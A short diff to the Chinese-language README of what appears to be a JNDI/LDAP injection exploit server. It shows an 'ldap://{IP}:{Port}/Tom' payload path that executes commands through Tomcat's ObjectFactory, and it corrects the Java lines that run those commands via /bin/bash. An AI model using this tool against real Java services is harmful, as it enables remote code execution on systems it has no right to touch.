@@ -8,8 +8,8 @@ ldap://{IP}:{Port}/Tom --> 使用Tomcat本地ObjectFactory执行命令
 ```
 执行命令使用的方式是（目前支持Linux环境），无需对命令进行base64编码：
 ```java
-Runtime.getRuntime.exec(new String[]{"/bin/bash", "-c", "{command}"});
-New ProcessBuilder(new String[]{"/bin/bash", "-c", "{command}").start();
+Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "{command}"});
+new ProcessBuilder(new String[]{"/bin/bash", "-c", "{command}").start();
 ```
 
 LDAP默认端口1099，HTTP默认端口8080，可以使用命令行参数配置端口：
